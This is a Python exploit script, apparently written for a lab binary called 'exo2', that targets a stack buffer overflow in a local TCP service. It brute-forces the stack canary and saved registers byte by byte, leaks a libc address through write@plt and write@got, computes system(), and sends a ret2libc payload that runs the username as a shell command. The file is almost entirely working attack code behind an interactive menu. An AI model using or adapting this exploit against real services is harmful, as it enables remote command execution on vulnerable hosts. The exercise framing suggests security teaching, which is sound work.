#!/usr/bin/python3
import socket as S
from binascii import hexlify, unhexlify
from struct import pack, unpack


#Overflow the stack with some data,
#return True if the data is correct
#	- right stack cookie
#	- right return address

def p64(x):
    return pack("<Q", x)



def oracle(username=b'toto', data=b'', timeout=0.5):
	try:
		# Connect to the server
		connected = False
		# while not connected:
		# 	try:
		# 		s = S.socket(S.AF_INET, S.SOCK_STREAM)
		# 		if timeout:
		# 			s.settimeout(timeout)
		# 		s.connect(('127.0.0.1',55555))
		# 		connected = True
		# 	except:
		# 		continue
		
		s = S.socket(S.AF_INET, S.SOCK_STREAM)
		if timeout:
			s.settimeout(timeout)
		s.connect(('127.0.0.1',55555))
		# connected = True	
		# Do hello
		s.send(pack("<H", 0));
		s.send(username);
		hello = s.recv(100);
		# print ("Server Hello: %s"%hello.decode())

		# Do ping-pong
		s.send(pack("<H", 1));
		
		buf = (b'A' * (1024))
		buf += data
		# 0x7fffffffccf0
		# user_input = input("Enter data to send (hex): ")
		
		s.send(pack("<H", len(buf)));
		s.send(buf)
		rep = s.recv(len(buf));
		# print ("Server pong : %s"%repr(rep))

		if rep != buf:
			print ("Bad pong reply")
			return False

		s.send(pack("<H", 2));
		bye = s.recv(100);
		# print("Server bye : %s"%bye.decode())
		if bye != b'Bye toto': 
			print("I am here")
			return False

		# Close connection
		s.close()
	except :
		# print ("Network Exception")
		return False

	return True
def leak_oracle(username=b'toto', data=b'', timeout=0.5):
    try:
        s = S.socket(S.AF_INET, S.SOCK_STREAM)
        if timeout:
            s.settimeout(timeout)

        s.connect(('127.0.0.1', 55555))

        # Hello
        s.send(pack("<H", 0))
        s.send(username)
        s.recv(100)

        # Ping-pong
        s.send(pack("<H", 1))

        buf = b'A' * 1024 + data

        s.send(pack("<H", len(buf)))
        s.send(buf)

        # Return the actual server response
        rep = s.recv(len(buf))

        s.close()
        return rep

    except Exception as e:
        print("Leak exception:", e)
        return b''

def bruteforce_stack(size, i):
    data = b''
    while len(data) < size:
        found = False
        i = 0
        for b in range(256):
           
            send_data = data + bytes((b,))
            # print("tried data: %s" % (hexlify(bytes((b,))))) 
            if oracle(data=send_data):
                data = send_data
                found = True
                break
            i += 1
        assert found == True
        print("Data: %s byte value: %i", data, i)
    return data

RETURN_ADDRESS_OFFSET = 0x1527

# readelf -s /lib32/libc.so.6 | grep -E ' write@@'
libc_write = 0x001139b0

#adelf -s /lib32/libc.so.6 | grep ' system@@'
libc_system = 0x0004f8e0

# objdump -R ./exo2 | grep write
exo2_write = 0x00003fc4

# objdump -d ./exo2 | grep -A3 '<write@plt>'
# 000010c0 <write@plt>:
exo2_write_plt = 0x000010c0

# readelf -s ./exo2 | grep -i username
username_offset = 0x4040

# 00bfeb0590af155f0000000018e0b7fff285155fdeadbeef40b0155f

def build_structured_payload(canary, ebx, esi, ebp, return_addr, fd):

    return pack(

        "<IIIIII",
        canary,
        ebx,
        esi,
        ebp,
        return_addr,
        fd
    )

def print_values(canary, ebx, esi, ebp, return_addr, fd,

                 binary_base=None, libc_base=None,

                 system_addr=None, username_addr=None):

    print("\n=== Current values ===")

    print(f"canary       = {canary:#010x}")

    print(f"ebx          = {ebx:#010x}")

    print(f"esi          = {esi:#010x}")

    print(f"ebp          = {ebp:#010x}")

    print(f"return_addr  = {return_addr:#010x}")

    print(f"fd           = {fd:#010x}")

    if binary_base is not None:

        print(f"binary_base  = {binary_base:#010x}")

    if libc_base is not None:

        print(f"libc_base    = {libc_base:#010x}")

    if system_addr is not None:

        print(f"system       = {system_addr:#010x}")

    if username_addr is not None:

        print(f"username     = {username_addr:#010x}")

def main():

    print("=== Initial setup ===")

    print("1. Run stack leak")

    print("2. Enter custom payload")

    setup = input("> ").strip()

    raw_payload = None

    canary = None

    ebx = None

    esi = None

    ebp = None

    return_addr = None

    fd = None

    binary_base = None

    libc_base = None

    system_addr = None

    username_addr = None

    if setup == "1":

        raw = bruteforce_stack(24, 0)

        canary, ebx, esi, ebp, return_addr, fd = unpack(

            "<IIIIII", raw

        )

        binary_base = return_addr - RETURN_ADDRESS_OFFSET

        username_addr = binary_base + username_offset

        print_values(

            canary, ebx, esi, ebp,

            return_addr, fd,

            binary_base=binary_base,

            username_addr=username_addr

        )

    elif setup == "2":

        print("\nEnter custom payload as hexadecimal:")

        value = input("> ").strip()

        try:

            raw_payload = unhexlify(value)

        except ValueError:

            print("Invalid hexadecimal payload.")

            return

        print(f"\nCustom payload loaded ({len(raw_payload)} bytes).")

        print("payload:", hexlify(raw_payload).decode())

    else:

        print("Unknown option.")

        return

    while True:

        print("\n=== Menu ===")

        print("1. Show current payload")

        print("2. Modify structured payload")

        print("3. Attack to get system address")

        print("4. Attack to run system function")

        print("5. Send current payload")

        print("6. Re-run stack leak")

        print("7. Enter custom raw payload")

        print("q. Quit")

        choice = input("> ").strip()

        if choice == "q":

            break

        # ---------------------------------------------------------

        # SHOW PAYLOAD

        # ---------------------------------------------------------

        elif choice == "1":

            if raw_payload is not None:

                data = raw_payload

                print("payload mode: CUSTOM")

            else:

                data = build_structured_payload(

                    canary,

                    ebx,

                    esi,

                    ebp,

                    return_addr,

                    fd

                )

                print("payload mode: STRUCTURED")

            print("payload:", hexlify(data).decode())

        # ---------------------------------------------------------

        # MODIFY STRUCTURED PAYLOAD

        # ---------------------------------------------------------

        elif choice == "2":

            if raw_payload is not None:

                print("Currently using a custom payload.")

                print("Run a stack leak first to return to structured mode.")

                continue

            print("\nEnter a field to modify:")

            print("canary")

            print("ebx")

            print("esi")

            print("ebp")

            print("return_addr")

            print("fd")

            field = input("> ").strip()

            if field not in {

                "canary",

                "ebx",

                "esi",

                "ebp",

                "return_addr",

                "fd"

            }:

                print("Unknown field.")

                continue

            value = input("New value (hex): ").strip()

            try:

                value = int(value, 16)

            except ValueError:

                print("Invalid hexadecimal value.")

                continue

            if field == "canary":

                canary = value

            elif field == "ebx":

                ebx = value

            elif field == "esi":

                esi = value

            elif field == "ebp":

                ebp = value

            elif field == "return_addr":

                return_addr = value

            elif field == "fd":

                fd = value

            print(f"{field} = {value:#010x}")

        # ---------------------------------------------------------

        # ATTACK 1: LEAK LIBC / GET SYSTEM

        # ---------------------------------------------------------

        elif choice == "3":

            if canary is None or binary_base is None:

                print("Run the stack leak first.")

                continue

            write_plt = binary_base + exo2_write_plt

            write_got = binary_base + exo2_write

            print("\n=== Attack: leak libc write ===")

            print(f"write@plt = {write_plt:#010x}")

            print(f"write@got = {write_got:#010x}")

            payload = pack(

                "<IIIIIIIII",

                canary,

                ebx,

                esi,

                ebp,

                write_plt,

                0,

                4,

                write_got,

                4

            )

            print("leak payload:")

            print(hexlify(payload).decode())

            username = input("username: ").encode()

            result = leak_oracle(

                username=username,

                data=payload

            )

            print("Server response:", repr(result))

            if len(result) < 4:

                print("Not enough bytes received for leak.")

                continue

            leak = result[:4]

            print("Leaked bytes:", hexlify(leak).decode())

            leaked_write = unpack("<I", leak)[0]

            libc_base = leaked_write - libc_write

            system_addr = libc_base + libc_system

            print("\n=== Libc leak ===")

            print(f"leaked write  = {leaked_write:#010x}")

            print(f"libc base     = {libc_base:#010x}")

            print(f"system        = {system_addr:#010x}")
        # ---------------------------------------------------------

        # ATTACK 2: RUN SYSTEM

        # ---------------------------------------------------------

        elif choice == "4":

            if system_addr is None:

                print("Get the system address first (option 3).")

                continue

            if username_addr is None:

                print("Username address is unknown.")

                continue

            print("\n=== Attack: run system ===")

            print(f"system   = {system_addr:#010x}")

            print(f"username = {username_addr:#010x}")

            #

            # Stack:

            #

            # canary

            # ebx

            # esi

            # ebp

            # system

            # fake return

            # username

            #

            payload = pack(

                "<IIIIIII",

                canary,

                ebx,

                esi,

                ebp,

                system_addr,

                0,

                username_addr

            )

            print("system payload:")

            print(hexlify(payload).decode())

            username = input("username: ").encode()

            print(

                oracle(

                    username=username,

                    data=payload

                )

            )

        # ---------------------------------------------------------

        # SEND CURRENT PAYLOAD

        # ---------------------------------------------------------

        elif choice == "5":

            username = input("username: ").encode()

            if raw_payload is not None:

                data = raw_payload

            else:

                data = build_structured_payload(

                    canary,

                    ebx,

                    esi,

                    ebp,

                    return_addr,

                    fd

                )

            print("payload:", hexlify(data).decode())

            print(

                oracle(

                    username=username,

                    data=data

                )

            )

        # ---------------------------------------------------------

        # RE-RUN STACK LEAK

        # ---------------------------------------------------------

        elif choice == "6":

            raw = bruteforce_stack(24, 0)

            canary, ebx, esi, ebp, return_addr, fd = unpack(

                "<IIIIII",

                raw

            )

            binary_base = return_addr - RETURN_ADDRESS_OFFSET

            username_addr = binary_base + username_offset

            libc_base = None

            system_addr = None

            raw_payload = None

            print_values(

                canary, ebx, esi, ebp,

                return_addr, fd,

                binary_base=binary_base,

                username_addr=username_addr

            )

        # ---------------------------------------------------------

        # CUSTOM RAW PAYLOAD

        # ---------------------------------------------------------

        elif choice == "7":

            print("\nEnter custom payload as hexadecimal:")

            value = input("> ").strip()

            try:

                raw_payload = unhexlify(value)

            except ValueError:

                print("Invalid hexadecimal payload.")

                continue

            print(

                f"Custom payload set ({len(raw_payload)} bytes)."

            )

            print(

                "payload:",

                hexlify(raw_payload).decode()

            )

        else:

            print("Unknown option.")
   
if __name__ == '__main__': main()







